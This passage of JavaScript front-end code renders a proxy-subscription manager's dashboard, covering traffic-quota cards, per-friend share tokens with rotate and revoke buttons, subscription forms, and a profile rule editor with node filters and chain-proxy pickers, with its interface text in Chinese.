  if (days < 0) return `<span class="exp-bad">已过期（${str}）</span>`;
  if (days < 30) return `<span class="exp-warn">${days} 天后到期（${str}）</span>`;
  return `<span class="exp-ok">${days} 天后到期（${str}）</span>`;
}

function renderTraffic() {
  const grid = document.getElementById('trafficGrid');
  if (!grid) return;

  if (state.subscriptions.length === 0) {
    grid.innerHTML = `<div class="empty" style="grid-column:1/-1">还没有订阅源</div>`;
    return;
  }

  grid.innerHTML = state.subscriptions
    .map((sub) => {
      const t = sub.traffic;

      if (!t) {
        return `
        <div class="tcard">
          <div class="tcard-name">${esc(sub.name)}
            <span class="tcard-fmt">每 ${sub.updateInterval}h 刷新</span>
          </div>
          <div class="empty" style="padding:24px 0">
            该订阅源未上报流量信息<br>
            <span style="font-size:11px">（上游没有返回 Subscription-Userinfo 响应头）</span>
          </div>
        </div>`;
      }

      const used = t.upload + t.download;
      const hasQuota = Boolean(t.total);
      const pct = hasQuota ? Math.min(100, (used / t.total) * 100) : 0;
      const fillClass = pct > 90 ? 'f-bad' : pct > 70 ? 'f-warn' : 'f-ok';
      const arcColor = pct > 90 ? '#f85149' : pct > 70 ? '#d29922' : '#6366f1';
      const R = 34;
      const C = 2 * Math.PI * R;

      return `
      <div class="tcard">
        <div class="tcard-name">${esc(sub.name)}
          <span class="tcard-fmt">每 ${sub.updateInterval}h 刷新</span>
        </div>
        ${sub.lastError ? `<div class="err-box">⚠ 上次同步失败：${esc(sub.lastError)}</div>` : ''}
        <div class="donut-wrap">
          <div class="donut">
            <svg width="78" height="78" viewBox="0 0 78 78">
              <circle cx="39" cy="39" r="${R}" fill="none" stroke="var(--border)" stroke-width="7"/>
              <circle cx="39" cy="39" r="${R}" fill="none" stroke="${arcColor}" stroke-width="7"
                stroke-dasharray="${C.toFixed(1)}"
                stroke-dashoffset="${(C * (1 - pct / 100)).toFixed(1)}"
                stroke-linecap="round"/>
            </svg>
            <div class="donut-inner">
              <span class="donut-pct">${hasQuota ? `${pct.toFixed(1)}%` : '∞'}</span>
              <span class="donut-sub">已用</span>
            </div>
          </div>
          <div class="tstats">
            <div class="trow"><span class="tkey">↑ 上传</span><span class="tval">${fmtBytes(t.upload)}</span></div>
            <div class="trow"><span class="tkey">↓ 下载</span><span class="tval">${fmtBytes(t.download)}</span></div>
            <div class="trow"><span class="tkey">剩余</span>
              <span class="tval" style="color:var(--ok)">${hasQuota ? fmtBytes(t.total - used) : '不限量'}</span></div>
            <div class="trow"><span class="tkey">总配额</span>
              <span class="tval">${hasQuota ? fmtBytes(t.total) : '不限量'}</span></div>
          </div>
        </div>
        <div class="pbar"><div class="pfill ${fillClass}" style="width:${pct.toFixed(1)}%"></div></div>
        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px;font-size:11px">
          <span style="color:var(--text3)">到期时间</span>
          ${airportExpireHtml(t.expire)}
        </div>
      </div>`;
    })
    .join('');
}

// ─────────────────────────────────────────────────────────────
//  共享管理页
// ─────────────────────────────────────────────────────────────

let friendsCache = [];

async function renderFriends() {
  const grid = document.getElementById('friendsGrid');
  if (!grid) return;

  // 好友卡片需要访问统计，走单独的接口（/state 不含这部分，
  // 因为它要按好友聚合日志表，成本比其余数据高）
  try {
    friendsCache = await api.get('/friends');
  } catch {
    return;
  }

  if (friendsCache.length === 0) {
    grid.innerHTML = `<div class="empty" style="grid-column:1/-1">
      还没有共享给任何人<br>
      <b>添加好友后，可以给他单独生成一条订阅链接</b><br>
      独立链接意味着可以单独吊销，不影响其他人
    </div>`;
    return;
  }

  grid.innerHTML = friendsCache
    .map((f) => {
      const active = f.tokens.filter((t) => !t.revoked);
      const a = f.access;

      return `
      <div class="fcard">
        <div class="fcard-head">
          <div class="avatar" style="background:${esc(f.color)};color:${avatarTextColor(f.color)};box-shadow:inset 0 0 0 1px rgb(0 0 0 / .1)">${esc(f.name.slice(0, 1))}</div>
          <div>
            <div class="fname">${esc(f.name)}</div>
            <div class="fsince">共享自 ${fmtDate(f.createdAt)}</div>
          </div>
          <div class="frefresh">上次拉取<br>${fmtTime(a.lastAccessAt)}</div>
        </div>

        <!--
          这三个数字全部来自 access_log，是真实采集的。
          刻意没有"本月用量 XX GB"—— 那个数字我们测不到，只能编。
        -->
        <div class="fstats">
          <div class="fstat">
            <div class="fstat-val">${a.total}</div>
            <div class="fstat-lbl">30 天拉取</div>
          </div>
          <div class="fstat">
            <div class="fstat-val">${a.distinctSources}</div>
            <div class="fstat-lbl">来源数</div>
          </div>
          <div class="fstat">
            <div class="fstat-val">${active.length}</div>
            <div class="fstat-lbl">有效链接</div>
          </div>
        </div>

        ${a.clients.length ? `<div class="ptags">${a.clients.map((c) => `<span class="ptag">${esc(c)}</span>`).join('')}</div>` : ''}

        ${
          state.meta?.trustProxy === false && a.distinctSources === 1
            ? `<div class="warn-box" style="margin:0 0 10px;font-size:11px">来源统计不可用（TRUST_PROXY 未开启）</div>`
            : a.distinctSources >= (state.meta?.shareSourceAlert ?? 3) && (state.meta?.shareSourceAlert ?? 3) > 0
            ? `<div class="warn-box" style="margin:0 0 10px;font-size:11px">
                 检测到 ${a.distinctSources} 个不同来源在拉取这条链接，可能已被转发。
                 如有疑虑可以轮换 token。<button class="icobtn" data-action="rotate-token" data-token="${esc(active[0]?.token ?? '')}">立即轮换</button>
               </div>`
            : ''
        }

        ${active
          .map(
            (t) => `
          <div class="token-row${(t.expiresAt !== null && t.expiresAt < Date.now()) || (t.maxAccess !== null && t.accessCount >= t.maxAccess) ? ' dead' : ''}">
            <span class="token-url" title="${esc(t.url)}">${esc(t.url)}</span>
            <span class="field-hint">${tokenExpiryHtml(t.expiresAt)} ${tokenQuotaHtml(t)}</span>
            <button class="icobtn" data-action="copy-token" data-url="${esc(t.url)}">复制</button>
            <button class="icobtn" data-action="edit-token" data-token="${esc(t.token)}">编辑</button>
            <button class="icobtn" data-action="rotate-token" data-token="${esc(t.token)}">轮换</button>
            <button class="icobtn danger" data-action="revoke-token" data-token="${esc(t.token)}">吊销</button>
          </div>`,
          )
          .join('')}

        ${f.note ? `<div class="fnote">💡 ${esc(f.note)}</div>` : ''}

        <div class="faction">
          <button class="fabtn" data-action="new-friend-token" data-id="${esc(f.id)}">＋ 生成链接</button>
          <button class="fabtn" data-action="friend-access" data-id="${esc(f.id)}">📊 拉取记录</button>
          <button class="fabtn" data-action="edit-friend" data-id="${esc(f.id)}">⚙️ 编辑</button>
        </div>
      </div>`;
    })
    .join('');
}

// ─────────────────────────────────────────────────────────────
//  模态框
// ─────────────────────────────────────────────────────────────

const overlay = document.getElementById('overlay');
const modalEl = document.getElementById('modal');

function openModal(html, wide = false, variant = '') {
  modalEl.className = ['modal', wide ? 'wide' : '', variant].filter(Boolean).join(' ');
  modalEl.innerHTML = html;
  overlay.classList.add('open');
}

function closeModal() {
  overlay.classList.remove('open');
  modalEl.innerHTML = '';
}

overlay.addEventListener('click', (e) => {
  if (e.target === overlay) closeModal();
});
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && overlay.classList.contains('open')) closeModal();
});

// ── 订阅源表单 ────────────────────────────────────────
function subscriptionModal(sub) {
  const editing = Boolean(sub);
  openModal(`
    <div class="modal-title">${editing ? '编辑订阅源' : '添加订阅源'}</div>
    <div class="modal-sub">粘贴机场给你的订阅链接。格式会自动识别（Clash YAML / base64 URI 列表）。</div>

    <div class="field">
      <label class="field-label">名称</label>
      <input class="input" id="f-name" value="${esc(sub?.name ?? '')}" placeholder="例如：某某机场">
    </div>
    <div class="field">
      <label class="field-label">订阅链接</label>
      <input class="input" id="f-url" value="${esc(sub?.url ?? '')}" placeholder="https://...">
      <div class="field-hint">这个链接内含你的机场凭据，请勿分享给他人。</div>
    </div>
    <div class="field-row">
      <div class="field">
        <label class="field-label">格式</label>
        <select class="select" id="f-format">
          <option value="auto"${sub?.format === 'auto' || !sub ? ' selected' : ''}>自动识别</option>
          <option value="clash"${sub?.format === 'clash' ? ' selected' : ''}>Clash YAML</option>
          <option value="uri-list"${sub?.format === 'uri-list' ? ' selected' : ''}>URI 列表 / base64</option>
        </select>
        <div class="field-hint">自动识别出错时才需要手动指定。</div>
      </div>
      <div class="field">
        <label class="field-label">同步间隔（小时）</label>
        <input class="input" id="f-interval" type="number" min="1" max="720"
               value="${sub?.updateInterval ?? 12}">
      </div>
    </div>
    <div class="field">
      <label class="field-label">抓取 User-Agent（可选）</label>
      <input class="input" id="f-ua" value="${esc(sub?.userAgent ?? '')}"
             placeholder="留空使用全局设置">
      <div class="field-hint">
        个别机场会按 UA 返回不同内容。如果拉到的节点数不对，可以试试改成
        <code>clash-verge/v2.0.0</code> 或 <code>v2rayN/6.45</code>。
      </div>
    </div>
    ${
      editing
        ? `<div class="checkbox-row">
             <input type="checkbox" id="f-enabled" ${sub.enabled ? 'checked' : ''}>
             <label for="f-enabled">启用（关闭后不再自动同步，已有节点保留）</label>
           </div>`
        : ''
    }

    <div class="modal-actions">
      ${editing ? `<button class="btn-danger" data-action="delete-sub" data-id="${esc(sub.id)}">删除</button>` : ''}
      <div class="spacer"></div>
      <button class="btn-sec" data-action="close-modal">取消</button>
      <button class="btn-pri" data-action="save-sub" data-id="${esc(sub?.id ?? '')}">
        ${editing ? '保存' : '添加并同步'}
      </button>
    </div>
  `);
}

async function saveSubscription(id) {
  const payload = {
    name: document.getElementById('f-name').value.trim(),
    url: document.getElementById('f-url').value.trim(),
    format: document.getElementById('f-format').value,
    updateInterval: Number(document.getElementById('f-interval').value) || 12,
    userAgent: document.getElementById('f-ua').value.trim() || null,
  };
  const enabledEl = document.getElementById('f-enabled');
  if (enabledEl) payload.enabled = enabledEl.checked;

  if (!payload.name || !payload.url) {
    toast('名称与订阅链接都不能为空', 'error');
    return;
  }

  try {
    if (id) {
      await api.patch(`/subscriptions/${encodeURIComponent(id)}`, payload);
      toast('已保存');
    } else {
      const result = await api.post('/subscriptions', payload);
      // 创建时会立即同步一次，把结果如实告诉用户 ——
      // 订阅链接失效是很常见的情况，早发现好过等到客户端拉不到才发现
      if (result.sync?.ok) {
        toast(`已添加，同步到 ${result.sync.nodeCount} 个节点`);
      } else {
        toast(`已添加，但同步失败：${result.sync?.error ?? '未知原因'}`, 'error');
      }
    }
    closeModal();
    await loadAll();
  } catch (err) {
    toast(err.message, 'error');
  }
}

// ── 规则编辑器 ────────────────────────────────────────
//
// 这是"生成、选择、过滤"三个动作的界面落点。设计上最关键的一点是
// **实时预览**：改任何一条规则都立刻看到会命中哪些节点、
// 各阶段过滤掉了多少、生成出来的配置长什么样。
// 没有预览的规则编辑器等于让用户盲写正则。

let editingProfile = null;

/**
 * 单条匹配表达式的一行。
 *
 * `index` 由调用方给出而不是由 map 的下标隐式决定 —— 新增一行时需要能
 * 单独渲染出正确索引的一行，靠字符串替换去改索引既脆弱又难读。
 */
function exprRowHtml(expr, kind, index) {
  return `
    <div class="expr-row" data-kind="${kind}" data-index="${index}">
      <select class="select expr-field">
        ${['name', 'server', 'type', 'region', 'source']
          .map((f) => `<option value="${f}"${expr.field === f ? ' selected' : ''}>${f}</option>`)
          .join('')}
      </select>
      <select class="select expr-op">
        ${[
          ['contains', '包含'],
          ['regex', '正则'],
          ['eq', '等于'],
        ]
          .map(([v, l]) => `<option value="${v}"${expr.op === v ? ' selected' : ''}>${l}</option>`)
          .join('')}
      </select>
      <input class="input expr-value" value="${esc(expr.value)}">
      <button class="mini-btn" data-action="del-expr" data-kind="${kind}" data-index="${index}">×</button>
    </div>`;
}

function exprRows(list, kind) {
  return (list ?? []).map((e, i) => exprRowHtml(e, kind, i)).join('');
}

/**
 * 打开配置文件编辑器。
 *
 * @param profile 传入则为编辑，传 null 为新建
 * @param seedRule 新建时的初始规则。「用勾选的节点新建配置」走的就是这条路径。
 */
function openProfilePage(profile, seedRule) {
  editingProfile = profile
    ? JSON.parse(JSON.stringify(profile))
    : {
        id: null,
        name: '',
        description: '',
        icon: '📦',
        rule: seedRule ?? { useDefaultExclude: true, dedupe: 'server-port', sort: 'region' },
        defaultTarget: 'shadowrocket',
        userinfoMode: 'sum',
        updateInterval: 12,
      };
  renderProductProfilePage();
}

/**
 * 依据当前的 `editingProfile` 重绘编辑器。
 *
 * 单独抽出来是因为有些操作（比如清除手动勾选）需要重绘整个表单，
 * 而此时不能走 `profileModal(...)` —— 那会按"传入了 profile"当成编辑模式，
 * 给一个还没保存的新配置渲染出删除按钮。
 */
function renderProfileModal() {
  const isEditing = Boolean(editingProfile.id);
  const r = editingProfile.rule;
  const regions = state.meta?.presentRegions ?? [];
  const types = state.meta?.presentTypes ?? [];

  openModal(
    `
    <div class="modal-title">${isEditing ? '编辑配置文件' : '新建配置文件'}</div>
    <div class="modal-sub">
      配置文件 = 一组过滤规则 + 一个默认输出格式。规则与格式解耦，
      同一份规则可以同时供 Clash、Shadowrocket、v2rayN 使用。
    </div>

    <div class="field-row">
      <div class="field" style="flex:0 0 70px">
        <label class="field-label">图标</label>
        <input class="input" id="p-icon" value="${esc(editingProfile.icon)}">
      </div>
      <div class="field">
        <label class="field-label">名称</label>
        <input class="input" id="p-name" value="${esc(editingProfile.name)}" placeholder="例如：香港全节点">
      </div>
      <div class="field">
        <label class="field-label">默认输出格式</label>
        <select class="select" id="p-target">
          ${(state.meta?.targets ?? [])
            .map(
              (t) =>
                `<option value="${esc(t.value)}"${editingProfile.defaultTarget === t.value ? ' selected' : ''}>${esc(t.label)}</option>`,
            )
            .join('')}
        </select>
      </div>
    </div>

    <div class="field">
      <label class="field-label">描述</label>
      <input class="input" id="p-desc" value="${esc(editingProfile.description)}">
    </div>

    <div class="field-hint" style="margin:-4px 0 14px">
      默认输出格式只在<strong>无法从 User-Agent 识别客户端时</strong>生效。
      Clash、Shadowrocket、v2rayN 等会被自动识别，各自拿到对应格式。
    </div>

    <div class="rule-grid">
      <div>
        <div class="rule-section">
          <div class="rule-section-title">地区</div>
          <div class="chip-group" id="p-regions">
            ${regions
              .map(
                (reg) => `<button class="chip${r.regions?.includes(reg.code) ? ' on' : ''}"
                  data-action="rule-region" data-value="${esc(reg.code)}">${reg.flag} ${esc(reg.name)}</button>`,
              )
              .join('') || '<span class="field-hint">暂无节点</span>'}
          </div>
        </div>

        <div class="rule-section" style="margin-top:10px">
          <div class="rule-section-title">协议</div>
          <div class="chip-group" id="p-types">
            ${types
              .map(
                (t) => `<button class="chip${r.types?.includes(t) ? ' on' : ''}"
                  data-action="rule-type" data-value="${esc(t)}">${esc(t.toUpperCase())}</button>`,
              )
              .join('') || '<span class="field-hint">暂无节点</span>'}
          </div>
        </div>

        <div class="rule-section" style="margin-top:10px">
          <div class="rule-section-title">链式代理</div>
          <div class="field-hint">仅 Shadowrocket 与 Clash.Meta 支持。筛选上限先作用于主规则，链式配对可额外增加输出。</div>
          <div class="checkbox-row" style="margin:8px 0">
            <input type="checkbox" id="p-chain-enabled" ${r.chain?.enabled ? 'checked' : ''}>
            <label for="p-chain-enabled">启用链式代理</label>
          </div>
          <div class="field-row">
            <div class="field"><label class="field-label">入口（前置）</label>
              <select class="select" id="p-chain-entry" multiple size="5">
                ${state.nodes.map((n) => `<option value="${esc(n.fingerprint)}"${r.chain?.entry?.pick?.includes(n.fingerprint) ? ' selected' : ''}>${esc(n.name)}</option>`).join('')}
              </select>
            </div>
            <div class="field"><label class="field-label">落地</label>
              <select class="select" id="p-chain-landing" multiple size="5">
                ${state.nodes.map((n) => `<option value="${esc(n.fingerprint)}"${r.chain?.landing?.pick?.includes(n.fingerprint) ? ' selected' : ''}>${esc(n.name)}</option>`).join('')}
              </select>
            </div>
          </div>
          <div class="field-row">
            <div class="field"><label class="field-label">命名模板</label><input class="input" id="p-chain-template" value="${esc(r.chain?.nameTemplate ?? '{landing} via {entry}')}"></div>
            <div class="field" style="flex:0 0 100px"><label class="field-label">最多配对</label><input class="input" id="p-chain-max" type="number" min="1" max="1000" value="${r.chain?.maxPairs ?? 200}"></div>
          </div>
          <div class="checkbox-row"><input type="checkbox" id="p-chain-direct" ${r.chain?.keepLandingDirect ? 'checked' : ''}><label for="p-chain-direct">同时保留落地直连节点</label></div>
        </div>

        <div class="rule-section" style="margin-top:10px">
          <div class="rule-section-title">包含（命中任一条即保留）</div>
          <div id="p-include">${exprRows(r.include, 'include')}</div>
          <button class="mini-btn" data-action="add-expr" data-kind="include">+ 添加条件</button>
        </div>

        <div class="rule-section" style="margin-top:10px">
          <div class="rule-section-title">排除（命中任一条即丢弃，优先级更高）</div>
          <div id="p-exclude">${exprRows(r.exclude, 'exclude')}</div>
          <button class="mini-btn" data-action="add-expr" data-kind="exclude">+ 添加条件</button>
        </div>
      </div>

      <div>
        <div class="rule-section">
          <div class="rule-section-title">整理</div>
          <div class="field">
            <label class="field-label">去重</label>
            <select class="select" id="p-dedupe">
              <option value="off"${r.dedupe === 'off' ? ' selected' : ''}>不去重</option>
              <option value="server-port"${r.dedupe === 'server-port' ? ' selected' : ''}>同服务器+端口视为重复</option>
              <option value="fingerprint"${r.dedupe === 'fingerprint' ? ' selected' : ''}>完全相同才算重复</option>
            </select>
          </div>
          <div class="field">
            <label class="field-label">排序</label>
            <select class="select" id="p-sort">
              ${[
                ['none', '保持原顺序'],
                ['region', '按地区'],
                ['name', '按名称'],
                ['type', '按协议'],
                ['source', '按订阅源'],
              ]
                .map(([v, l]) => `<option value="${v}"${r.sort === v ? ' selected' : ''}>${l}</option>`)
                .join('')}
            </select>
          </div>
          <div class="field">
            <label class="field-label">数量上限（0 = 不限）</label>
            <input class="input" id="p-limit" type="number" min="0" max="5000" value="${r.limit ?? 0}">
          </div>
          <div class="field">
            <label class="field-label">重命名模板（可选）</label>
            <input class="input" id="p-rename" value="${esc(r.rename?.[0]?.replace ?? '')}"
                   placeholder="{flag} {regionZh} {index2}">
            <div class="field-hint">
              可用占位符：<code>{flag}</code> <code>{region}</code> <code>{regionZh}</code>
              <code>{type}</code> <code>{source}</code> <code>{index}</code> <code>{index2}</code>
              <code>{name}</code>。留空则保持原名。
            </div>
          </div>
          <div class="checkbox-row">
            <input type="checkbox" id="p-defexc" ${r.useDefaultExclude !== false ? 'checked' : ''}>
            <label for="p-defexc">过滤机场的信息节点（"剩余流量""官网"等）</label>
          </div>
        </div>

        <div class="rule-section" style="margin-top:10px">
          <div class="rule-section-title">流量信息</div>
          <select class="select" id="p-userinfo">
            <option value="sum"${editingProfile.userinfoMode === 'sum' ? ' selected' : ''}>合计所有订阅源</option>
            <option value="off"${editingProfile.userinfoMode === 'off' ? ' selected' : ''}>不输出</option>
            ${state.subscriptions
              .map(
                (s) =>
                  `<option value="follow:${esc(s.id)}"${editingProfile.userinfoMode === `follow:${s.id}` ? ' selected' : ''}>跟随「${esc(s.name)}」</option>`,
              )
              .join('')}
          </select>
          <div class="field-hint">
            决定客户端里显示的流量条。合计后的数字与任何一家机场后台都对不上，
            如果只关心主力机场，选"跟随"更直观。
          </div>
        </div>

        ${
          r.pick?.length
            ? `<div class="rule-section" style="margin-top:10px">
                 <div class="rule-section-title">手动勾选</div>
                 <div class="field-hint">
                   已勾选 <b>${r.pick.length}</b> 个节点。勾选模式下其余筛选条件全部忽略，
                   所见即所得。勾选记录基于节点指纹，上游改名后依然有效。
                 </div>
                 <button class="mini-btn" data-action="clear-rule-pick" style="margin-top:8px">清除勾选</button>
               </div>`
            : ''
        }
      </div>
    </div>

    <div class="rule-section" style="margin-top:14px">
      <div class="rule-section-title">实时预览</div>
      <div class="stat-line" id="p-stats">正在计算…</div>
      <div class="preview-box" id="p-preview"></div>
    </div>

    <div class="modal-actions">
      ${isEditing ? `<button class="btn-danger" data-action="delete-profile" data-id="${esc(editingProfile.id)}">删除</button>` : ''}
      <div class="spacer"></div>
      <button class="btn-sec" data-action="close-modal">取消</button>
      <button class="btn-pri" data-action="save-profile">${isEditing ? '保存' : '创建'}</button>
    </div>
  `,
    true,
  );

  refreshPreview();
}

// Kept as a compatibility reference for older saved page state; new profiles use the product workspace below.
void renderProfileModal;

let chainPickerQuery = '';

function chainPicked(role) {
  return new Set(editingProfile.rule.chain?.[role]?.pick ?? []);
}

function chainPickerHtml() {
  const rule = editingProfile.rule.chain ?? { enabled: false, entry: { pick: [] }, landing: { pick: [] } };
  const entry = chainPicked('entry');
  const landing = chainPicked('landing');
  const query = chainPickerQuery.trim().toLowerCase();
  const candidates = state.nodes.filter((node) => {
    if (!query) return true;
    return `${node.name} ${node.server} ${node.type} ${node.region ?? ''}`.toLowerCase().includes(query);
  });
  const selectedRows = (role, set, empty) => {
    const selected = state.nodes.filter((node) => set.has(node.fingerprint));
    return selected.length
      ? selected.map((node) => `<span class="pe-chip"><span>${regionFlag(node.region)} ${esc(node.name)}</span><button type="button" data-action="chain-remove" data-role="${role}" data-fp="${esc(node.fingerprint)}" title="移除">×</button></span>`).join('')
      : `<span class="pe-empty">${empty}</span>`;
  };
  return `
    <section class="pe-card pe-chain-card" id="chainPicker">
      <div class="pe-card-head">
        <div><div class="pe-kicker">OPTIONAL ROUTE</div><h2>链式代理</h2><p>从同一批节点中添加入口和落地。普通订阅不受影响。</p></div>
        <label class="pe-switch"><input type="checkbox" id="p-chain-enabled" ${rule.enabled ? 'checked' : ''}><span></span><b>${rule.enabled ? '已启用' : '未启用'}</b></label>
      </div>
      <div class="pe-role-summary">
        <div class="pe-role"><div class="pe-role-title"><span class="pe-role-dot entry"></span>入口 <b>${entry.size}</b></div><div class="pe-chip-list">${selectedRows('entry', entry, '还没有入口节点')}</div></div>
        <div class="pe-route-arrow">→</div>
        <div class="pe-role"><div class="pe-role-title"><span class="pe-role-dot landing"></span>落地 <b>${landing.size}</b></div><div class="pe-chip-list">${selectedRows('landing', landing, '还没有落地节点')}</div></div>
      </div>
      <div class="pe-picker-toolbar"><div><strong>添加节点</strong><span>搜索后点击“入口”或“落地”</span></div><input class="input pe-search" id="p-chain-search" value="${esc(chainPickerQuery)}" placeholder="搜索名称、服务器或协议"></div>
      <div class="pe-candidate-list">
        ${candidates.length ? candidates.map((node) => `
          <div class="pe-candidate">
            <div class="pe-candidate-main"><span class="pe-node-name">${regionFlag(node.region)} ${esc(node.name)}</span><span class="pe-node-meta">${esc(node.type.toUpperCase())} · ${esc(node.server)}:${node.port}</span></div>
            <div class="pe-candidate-actions"><button class="pe-add-btn${entry.has(node.fingerprint) ? ' selected' : ''}" data-action="chain-add" data-role="entry" data-fp="${esc(node.fingerprint)}">${entry.has(node.fingerprint) ? '入口 ✓' : '+ 入口'}</button><button class="pe-add-btn${landing.has(node.fingerprint) ? ' selected' : ''}" data-action="chain-add" data-role="landing" data-fp="${esc(node.fingerprint)}">${landing.has(node.fingerprint) ? '落地 ✓' : '+ 落地'}</button></div>
          </div>`).join('') : '<div class="pe-empty pe-empty-large">没有匹配的节点</div>'}
      </div>
      <div class="pe-chain-options"><label class="field"><span class="field-label">统一名称</span><input class="input" id="p-chain-template" value="${esc(rule.nameTemplate ?? '{entry} -RELAY- {landing}')}"><small>默认格式：前置 -RELAY- 落地</small></label><label class="field"><span class="field-label">最多配对</span><input class="input" id="p-chain-max" type="number" min="1" max="1000" value="${rule.maxPairs ?? 200}"></label><label class="checkbox-row pe-direct"><input type="checkbox" id="p-chain-direct" ${rule.keepLandingDirect ? 'checked' : ''}>同时保留落地直连</label></div>
    </section>`;
}

function refreshChainPicker(restoreSearchFocus = false) {
  const picker = document.getElementById('chainPicker');
  if (picker) picker.outerHTML = chainPickerHtml();
  if (restoreSearchFocus) {
    const search = document.getElementById('p-chain-search');
    search?.focus();
    search?.setSelectionRange(chainPickerQuery.length, chainPickerQuery.length);
  }
}

let profileNodePickerQuery = '';

function profileNodePickerHtml() {
  const picked = new Set(editingProfile.rule.pick ?? []);
  const query = profileNodePickerQuery.trim().toLowerCase();
  const candidates = state.nodes.filter((node) => {
    if (!query) return true;
    return `${node.name} ${node.server} ${node.type} ${node.region ?? ''}`.toLowerCase().includes(query);
  });
  const selected = state.nodes.filter((node) => picked.has(node.fingerprint));
  const pickMode = editingProfile.rule.pickMode ?? 'only';
  const selectedHtml = selected.length
    ? selected.map((node) => `<span class="pe-chip"><span>${regionFlag(node.region)} ${esc(node.name)}</span><button type="button" data-action="profile-node-toggle" data-fp="${esc(node.fingerprint)}" title="移除">×</button></span>`).join('')
    : '<span class="pe-empty">还没有直接选择节点</span>';

  return `
    <section class="pe-card pe-direct-picker" id="profileNodePicker">
      <div class="pe-card-head"><div><div class="pe-kicker">01 · DIRECT PICK</div><h2>直接选择节点</h2><p>可按名称、服务器或协议搜索并直接勾选。地区和协议筛选仍可作为辅助条件。</p></div><span class="pe-count-pill">已选择 ${selected.length} 个</span></div>
      <div class="pe-picker-toolbar"><div><strong>所选节点</strong><span>${pickMode === 'only' ? '只生成已选择的节点' : '将已选择节点加入地区/协议筛选结果'}</span></div><select class="select pe-pick-mode" id="p-pick-mode"><option value="only"${pickMode === 'only' ? ' selected' : ''}>仅使用所选节点</option><option value="union"${pickMode === 'union' ? ' selected' : ''}>加入筛选结果</option></select></div>
      <div class="pe-chip-list pe-direct-picked">${selectedHtml}</div>
      <div class="pe-picker-toolbar"><div><strong>从节点列表选择</strong><span>选择操作不会刷新整个页面，也会保留当前搜索词。</span></div><input class="input pe-search" id="p-node-search" value="${esc(profileNodePickerQuery)}" placeholder="搜索名称、服务器或协议"></div>
      <div class="pe-candidate-list">
        ${candidates.length ? candidates.map((node) => `<div class="pe-candidate"><div class="pe-candidate-main"><span class="pe-node-name">${regionFlag(node.region)} ${esc(node.name)}</span><span class="pe-node-meta">${esc(node.type.toUpperCase())} · ${esc(node.server)}:${node.port}</span></div><div class="pe-candidate-actions"><button class="pe-add-btn${picked.has(node.fingerprint) ? ' selected' : ''}" data-action="profile-node-toggle" data-fp="${esc(node.fingerprint)}">${picked.has(node.fingerprint) ? '已选择 ✓' : '+ 选择'}</button></div></div>`).join('') : '<div class="pe-empty pe-empty-large">没有匹配的节点</div>'}
      </div>
    </section>`;
}

function refreshProfileNodePicker(restoreSearchFocus = false) {
  const picker = document.getElementById('profileNodePicker');
  if (picker) picker.outerHTML = profileNodePickerHtml();
  if (restoreSearchFocus) {
    const search = document.getElementById('p-node-search');
    search?.focus();
    search?.setSelectionRange(profileNodePickerQuery.length, profileNodePickerQuery.length);
  }
}

function updateProfilePickNote() {
  const note = document.querySelector('.pe-selected-note');
  if (!note) return;
  const count = editingProfile.rule.pick?.length ?? 0;
  if (!count) {
    note.remove();
    return;
  }
  const clear = note.querySelector('[data-action="clear-rule-pick"]');
  note.replaceChildren(document.createTextNode(`已固定选择 ${count} 个节点`));
  if (clear) note.append(clear);
}

function renderProductProfilePage() {
  const profile = editingProfile;
  const r = profile.rule;
  const isEditing = Boolean(profile.id);
  const regions = state.meta?.presentRegions ?? [];
  const types = state.meta?.presentTypes ?? [];
  const targetOrder = ['shadowrocket', 'clash.meta', 'clash', 'v2ray'];
  const targets = targetOrder.map((value) => state.meta?.targets.find((target) => target.value === value)).filter(Boolean);
  const editor = document.getElementById('pane-profile-editor');
  if (!editor) return;
  editor.classList.add('profile-editor-page');
  editor.innerHTML = `
    <div class="pe-shell">
      <header class="pe-header"><div class="pe-brand"><button class="pe-back" data-action="close-modal" title="返回">←</button><div><div class="pe-kicker">SUBSCRIPTION PROFILE</div><h1>${isEditing ? '编辑配置文件' : '新建配置文件'}</h1></div></div><div class="pe-header-actions"><span class="pe-status"><i></i>草稿自动保存于本地页面</span><button class="btn-sec" data-action="close-modal">取消</button><button class="btn-pri" data-action="save-profile">${isEditing ? '保存修改' : '创建配置'}</button></div></header>
      <div class="pe-layout">
        <aside class="pe-rail"><div class="pe-rail-label">配置步骤</div><div class="pe-rail-item active"><b>01</b><span>基础信息</span></div><div class="pe-rail-item"><b>02</b><span>节点筛选</span></div><div class="pe-rail-item"><b>03</b><span>链式代理</span><em>可选</em></div><div class="pe-rail-item"><b>04</b><span>输出设置</span></div><div class="pe-rail-note"><strong>设计原则</strong><p>先选择，再配置。保存后可随时编辑，不需要先理解输出文件。</p></div></aside>
        <main class="pe-main">
          <section class="pe-hero"><div class="pe-icon-input"><input class="input" id="p-icon" value="${esc(profile.icon)}" maxlength="2"><small>图标</small></div><div class="pe-hero-fields"><label class="field"><span class="field-label">配置名称</span><input class="input pe-title-input" id="p-name" value="${esc(profile.name)}" placeholder="例如：日常办公节点"></label><label class="field"><span class="field-label">描述</span><input class="input" id="p-desc" value="${esc(profile.description)}" placeholder="给自己看的用途说明"></label></div></section>
          <section class="pe-card"><div class="pe-card-head"><div><div class="pe-kicker">01 · SELECT</div><h2>节点筛选</h2><p>先缩小候选范围，再决定是否添加链式节点。</p></div><span class="pe-count-pill">${state.nodes.length} 个可用节点</span></div><div class="pe-filter-grid"><div class="pe-filter-block"><span class="field-label">地区</span><div class="chip-group" id="p-regions">${regions.map((reg) => `<button class="chip${r.regions?.includes(reg.code) ? ' on' : ''}" data-action="rule-region" data-value="${esc(reg.code)}">${reg.flag} ${esc(reg.name)}</button>`).join('') || '<span class="pe-empty">暂无地区数据</span>'}</div></div><div class="pe-filter-block"><span class="field-label">协议</span><div class="chip-group" id="p-types">${types.map((type) => `<button class="chip${r.types?.includes(type) ? ' on' : ''}" data-action="rule-type" data-value="${esc(type)}">${esc(type.toUpperCase())}</button>`).join('') || '<span class="pe-empty">暂无协议数据</span>'}</div></div></div></section>
          ${profileNodePickerHtml()}
          ${chainPickerHtml()}
